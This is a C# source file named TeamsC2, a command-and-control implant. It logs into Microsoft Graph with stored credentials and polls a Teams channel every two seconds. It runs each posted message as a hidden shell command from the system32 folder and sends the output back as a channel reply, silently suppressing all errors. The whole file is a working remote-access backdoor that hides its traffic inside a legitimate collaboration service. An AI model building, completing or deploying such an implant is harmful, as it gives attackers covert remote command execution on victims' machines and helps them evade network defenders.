using Microsoft.Identity.Client;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Configuration;
using System.Linq;
using System.Net.Http;
using System.Security;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Web;

namespace TeamsC2
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                RunAsync().GetAwaiter().GetResult();
            }
            catch (Exception ex)
            {
                //Console.ForegroundColor = ConsoleColor.Red;
                //Console.WriteLine(ex.Message);
                //Console.ResetColor();
            }

            //Console.WriteLine("Press any key to exit");
            //Console.ReadKey();
        }

        private static async Task RunAsync()
        {
            try
            {
                AuthenticationResult result = null;
                result = await Auth();
                DateTime exp = result.ExpiresOn.DateTime;

                if (result != null)
                {

                    string groupid = await GetGroupDetails(result.AccessToken, ConfigurationManager.AppSettings["GroupName"].ToString());
                    string channelid = await GetChannelDetails(result.AccessToken, groupid);

                    while (true)
                    {
                        int exptime = DateTime.Compare(exp, DateTime.Now.ToUniversalTime().AddMinutes(10));
                        if (exptime < 0)
                        {
                            result = await Auth();
                            exp = result.ExpiresOn.DateTime;
                        }
                        await GetMessage(result.AccessToken, groupid, channelid);
                        Thread.Sleep(2000);
                    }
                }
            }
            catch (Exception ex)
            {
                //Console.WriteLine(ex.Message);
            }
        }
        public static async Task<AuthenticationResult> Auth()
        {
          

            string[] scopes = new string[] { "https://graph.microsoft.com/.default" };
            IPublicClientApplication apps;
            apps = PublicClientApplicationBuilder.Create(ConfigurationManager.AppSettings["ClientId"].ToString())
                  .WithAuthority(AadAuthorityAudience.AzureAdMultipleOrgs)
                  .Build();

            AuthenticationResult result = null;

            try
            {
                var securePassword = new SecureString();
                foreach (char c in ConfigurationManager.AppSettings["Password"].ToString())        // you should fetch the password
                    securePassword.AppendChar(c);  // keystroke by keystroke

                result = await apps.AcquireTokenByUsernamePassword(scopes, ConfigurationManager.AppSettings["UserName"].ToString(), securePassword).ExecuteAsync();
            }
            catch (MsalException ex)
            {
                //Console.WriteLine(ex.Message);
            }


            return result;
        }

        public static async Task<string> GetGroupDetails(string AccessToken, string GroupName)
        {
            #region GetGroupDetails
            var httpClient = new HttpClient();
            var apiCaller = new ProtectedApiCallHelper(httpClient);
            groupdetails groupDetails = new groupdetails();
            var url = $"https://graph.microsoft.com/beta/groups?$filter=startswith(displayname, '{GroupName}')";
            JObject gDetails = await apiCaller.CallGetWebApiAndProcessResultASync(url, AccessToken);

            IList<JToken> groupresults = gDetails["value"].Children().ToList();

            IList<groupdetails> groupsearchResults = new List<groupdetails>();
            foreach (JToken res in groupresults)
            {
                groupDetails = res.ToObject<groupdetails>();
                groupsearchResults.Add(groupDetails);
            }
            return groupDetails.id;
            #endregion GetGroupDetails
        }

        public static async Task<string> GetChannelDetails(string AccessToken, string groupid)
        {
            #region GetChannelDetails
            var httpClient = new HttpClient();
            var apiCaller = new ProtectedApiCallHelper(httpClient);
            channeldetails channelDetails = new channeldetails();
            var url = $"https://graph.microsoft.com/beta/teams/{groupid}/channels";
            JObject cDetails = await apiCaller.CallGetWebApiAndProcessResultASync(url, AccessToken);

            IList<JToken> channelresults = cDetails["value"].Children().ToList();

            IList<channeldetails> channelsearchResults = new List<channeldetails>();
            foreach (JToken res in channelresults)
            {
                channelDetails = res.ToObject<channeldetails>();
                channelsearchResults.Add(channelDetails);
            }
            return channelDetails.id;
            #endregion GetChannelDetails
        }
        public static async Task GetReply(string AccessToken, string groupid, string channelid, string messageid, string input)
        {
            var httpClient = new HttpClient();
            var apiCaller = new ProtectedApiCallHelper(httpClient);

            var url = $"https://graph.microsoft.com/beta/teams/{groupid}/channels/{channelid}/messages/{messageid}/replies";
            JObject channelmessagesDetails = await apiCaller.CallGetWebApiAndProcessResultASync(url, AccessToken);

            IList<JToken> channelmessagesresults = channelmessagesDetails["value"].Children().ToList();

            if (channelmessagesresults.Count == 0)
            {
                try
                {
                    string output = ShellExecuteWithPath(input, @"c:\\windows\system32\");
                    Thread.Sleep(2000);
                    await SendReply(AccessToken, groupid, channelid, messageid, TextToHtml(output));
                }
                catch (Exception ex)
                {
                    await SendReply(AccessToken, groupid, channelid, messageid, TextToHtml(ex.Message));
                    //Console.WriteLine(ex.Message);
                }
            }
        }

        public static async Task GetMessage(string AccessToken, string groupid, string channelid)
        {

            channelmessages channelMessages = new channelmessages();

            var httpClient = new HttpClient();
            var apiCaller = new ProtectedApiCallHelper(httpClient);

            var url = $"https://graph.microsoft.com/beta/teams/{groupid}/channels/{channelid}/messages";
            JObject channelmessagesDetails = await apiCaller.CallGetWebApiAndProcessResultASync(url, AccessToken);

            IList<JToken> channelmessagesresults = channelmessagesDetails["value"].Children().ToList();

            // serialize JSON results into .NET objects
            IList<channelmessages> channelmessagessearchResults = new List<channelmessages>();
            foreach (JToken res in channelmessagesresults)
            {
                channelMessages = res.ToObject<channelmessages>();
                channelmessagessearchResults.Add(channelMessages);
                await GetReply(AccessToken, groupid, channelid, channelMessages.id, channelMessages.body.content);
            }

        }
        public static async Task SendReply(string AccessToken, string groupid, string channelid, string messageid, string value)
        {
            var httpClient = new HttpClient();
            var apiCaller = new ProtectedApiCallHelper(httpClient);

            var url = $"https://graph.microsoft.com/beta/teams/{groupid}/channels/{channelid}/messages/{messageid}/replies";
            createmessages createmailmessagedetails = new createmessages();

            messagebody body = new messagebody();
            body.contentType = "html";
            body.content = value;

            createmailmessagedetails.body = body;

            string data = JsonConvert.SerializeObject(createmailmessagedetails);

            JObject createmailmessage = await apiCaller.CallPostWebApiAndProcessResultASync(url, AccessToken, data);

        }

        public static string ShellExecuteWithPath(string ShellCommand, string Path, string Username = "", string Domain = "", string Password = "")
        {

            if (ShellCommand == null || ShellCommand == "") return "";

            string ShellCommandName = ShellCommand.Split(' ')[0];
            string ShellCommandArguments = "";
            if (ShellCommand.Contains(" "))
            {
                ShellCommandArguments = ShellCommand.Replace(ShellCommandName + " ", "");
            }

            System.Diagnostics.Process shellProcess = new System.Diagnostics.Process();
            if (Username != "")
            {
                shellProcess.StartInfo.UserName = Username;
                shellProcess.StartInfo.Domain = Domain;
                System.Security.SecureString SecurePassword = new System.Security.SecureString();
                foreach (char c in Password)
                {
                    SecurePassword.AppendChar(c);
                }
                shellProcess.StartInfo.Password = SecurePassword;
            }
            shellProcess.StartInfo.FileName = ShellCommandName;
            shellProcess.StartInfo.Arguments = ShellCommandArguments;
            shellProcess.StartInfo.WorkingDirectory = Path;
            shellProcess.StartInfo.UseShellExecute = false;
            shellProcess.StartInfo.CreateNoWindow = true;
            shellProcess.StartInfo.RedirectStandardOutput = true;
            shellProcess.StartInfo.RedirectStandardError = true;

            var output = new StringBuilder();
            shellProcess.OutputDataReceived += (sender, args) => { output.AppendLine(args.Data); };
            shellProcess.ErrorDataReceived += (sender, args) => { output.AppendLine(args.Data); };

            shellProcess.Start();

            shellProcess.BeginOutputReadLine();
            shellProcess.BeginErrorReadLine();
            shellProcess.WaitForExit();

            return output.ToString().TrimEnd();
        }

        public static string TextToHtml(string text)
        {
            text = HttpUtility.HtmlEncode(text);
            text = text.Replace("\r\n", "\r");
            text = text.Replace("\n", "\r");
            text = text.Replace("\r", "<br>\r\n");
            text = text.Replace("  ", " &nbsp;");
            return text;
        }

    }
}
